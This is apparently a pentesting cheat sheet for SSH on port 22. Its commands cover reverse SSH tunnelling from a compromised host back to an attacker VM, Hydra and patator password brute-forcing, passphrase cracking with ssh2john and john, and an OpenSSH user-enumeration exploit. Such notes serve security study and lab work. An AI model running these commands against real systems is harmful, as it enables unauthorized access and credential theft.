# 22 - SSH

{% hint style="danger" %}
In case it fails due to enconding > try

```
dos2unix id_rsa
```
{% endhint %}

## Solve ciphers and host keys issues

{% code overflow="wrap" fullWidth="true" %}
```bash
ssh root@10.11.1.1 -o KexAlgorithms=diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss 
```
{% endcode %}

## Skip host key and password

{% code overflow="wrap" fullWidth="true" %}
```bash
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" [-p port] <username>@<IP|hostname>

# FOR THE HOST KEY (TYPICAL MESSAGE WHEN WE FIRST CONNECT VIA SSH)
ssh -R ... -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@$IP

# EASY WAY TO ALLOW CONNECTIONS TO OUR MACHINE SAFELY - ADD A NEW USER TO OUR ATTACKING VM
sudo adduser tunneluser # set /bin/true as its shell and use a complex password

# ANOTHER WAY. TO NOT ENTER OUR PASSWORD, WE ALLOW THE VICTIM TO CONNECT TO US WITH SSH
mkdir -p /tmp/keys && cd keys
ssh keygen
Enter file: /tmp/keys/id_rsa
# Modify id_rsa.pub to put some restrictions: access only from that IP, ignore 
#commands, prevent agent and X11 forwarding, prevent the user from being allocated a tty
from="10.11.1.123",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhU r4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68 Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8 i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/ US2LoqHxs7OxNq61BLtr4I/MDnin www-data@box
# The file above has to be placed at ~/.ssh/authorized_keys
# Final SSH command
ssh -f -N -R ... -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@$IP
```
{% endcode %}

## Log in with private key (id\_rsa)

```bash
cat id_rsa > authorized_keys

# Copy the content to local with id_rsa name.
chmod 600 id_rsa
ssh -i id_rsa
```

## Brute force with Hydra

```bash
hydra -l $USER -P rockyou.txt ssh://$IP:$PORT
```

## Crack private keys with ssh2john and john

```bash
./usr/share/john/ssh2john.py id_rsa.private > id_rsa.john

john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john #get passphrase
```

## sshpass

```bash
sshpass -P 'password' user@target
```

## RSA / Retrieve private key from weak public key

RSA attack tool (mainly for CTF) - retrieve private key from weak public key and/or uncipher data

[https://github.com/RsaCtfTool/RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)

## Brute force old SSH/web with patator

{% code overflow="wrap" fullWidth="true" %}
```bash
patator ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'

patator http_fuzz url="" method=POST body='username=admin&password=FILE0' 0=rockyou.txt -x ignore:fgrep="Invalid password"
```
{% endcode %}

## User enumeration script

```bash
# OpenSSH < 7.7
https://www.exploit-db.com/exploits/45939
python 45939.py $IP $USERNAME
```

## OpenSSL exploit

We need the public key, combined with the very old version of openssl running on the system

(openssl version found with the `dpkg -l` command)

## From SSH encrypted key to non-password key

```
openssl rsa -in home/user/.ssh/encrypted_id_rsa -out ~/decrypted_id_rsa
```

